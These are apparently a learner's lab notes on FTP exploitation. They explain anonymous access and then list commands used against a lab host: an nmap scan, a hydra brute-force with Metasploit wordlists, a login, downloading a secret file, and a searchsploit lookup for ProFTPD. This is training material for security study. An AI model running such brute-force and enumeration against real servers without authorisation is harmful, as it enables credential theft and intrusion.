#### FTF Exploitation
- FTP (File transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and clients/client
- It is also frequently used as a means of transfering files to and from the directory of a web server.
- FTP authentication requires a username and password combination.As a result,we can perform a brute-force attack on th FTP sever in order to identify legitimate credentials
- In some cases,FTP servers may be configured to allow anonymous access which consequently allows to access to the FTP server without providing any legitimate credentials.
#### Lab
- nmap -sV 192.93.66.3 [finding ftp service]
- ftp 192.93.66.3 [ for accessing ftp ]
- ls -al /usr/share/nmap/scripts/ | grep ftp-* [ this will list all the ftp scripts ]
- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 ftp [ for loging credentials finding ]
- ftp 192.93.66.3 [ again the access with fing credentials ]
- get secret.txt [ download a file ]
- searchsploit  Proftpd [ here Proftpd is the service ]
